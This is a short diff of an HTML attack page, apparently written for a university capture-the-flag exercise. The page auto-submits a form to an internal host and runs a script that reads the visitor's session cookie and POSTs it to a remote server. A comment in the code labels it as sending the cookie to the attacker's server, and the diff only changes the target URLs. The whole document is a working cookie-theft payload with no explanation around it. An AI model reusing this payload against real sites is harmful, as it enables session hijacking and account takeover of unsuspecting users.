@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <form action="http://svb:5003/dashboard" method="GET">
+        <form action="http://svb:5003/" method="GET">
         </form>
         <script>
             document.forms[0].submit();
@@ -9,7 +9,7 @@
             // Send the session cookie to attacker's server
             var cookie = document.cookie;
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "http://cs2107-ctfd-i.comp.nus.edu:5003/dashboard");
+            xhr.open("POST", "http://cs2107-ctfd-i.comp.nus.edu:5003/login");
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send("cookie=" + cookie);
         </script>
